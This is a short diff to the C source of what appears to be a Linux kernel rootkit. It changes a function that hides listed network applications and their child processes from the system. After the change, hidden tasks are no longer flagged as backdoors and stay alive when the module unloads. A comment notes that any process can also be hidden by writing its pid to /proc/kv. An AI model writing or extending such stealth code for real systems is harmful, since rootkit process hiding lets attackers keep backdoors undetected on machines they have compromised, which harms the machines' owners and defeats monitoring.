@@ -472,10 +472,12 @@ void kv_scan_and_hide_netapp(void) {
             prinfo("Hide netapp task: %d %s i=%d '%s'\n", t->pid, fnode->filename, i, netapp_list[i]);
             /**
              * notice that any netapp added here
-             * will be killed if
-             * rk is unloaded so we won't leave traces behind
+             * will NOT be killed if kv is unloaded
+             * In reality an application that is listed in netapp_list will be handled
+             * in the same way as if you manually hide a parent process:
+             *  echo <pid of parent> >/proc/kv
              */
-            kv_hide_task_by_pid(t->pid, 1 /* handle as backdoor */, CHILDREN /* hide children */);
+            kv_hide_task_by_pid(t->pid, 0 /* not a backdoor */, CHILDREN /* hide children */);
             break;
         }
 
